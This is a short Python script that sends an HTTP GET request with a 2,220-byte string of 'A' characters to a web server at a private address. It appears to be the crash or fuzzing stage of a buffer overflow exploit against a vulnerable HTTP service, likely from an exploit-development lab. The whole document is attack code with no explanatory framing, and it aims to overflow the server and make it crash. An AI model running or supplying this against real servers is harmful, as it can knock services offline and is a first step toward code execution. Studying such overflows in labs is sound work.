#!/usr/bin/python
import socket

target_address="192.168.1.10"
target_port=80

buffer = "GET " + "\x41" * 2220 + " HTTP/1.1\r\n\r\n"

sock=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connect=sock.connect((target_address, target_port))
sock.send(buffer)
sock.close()

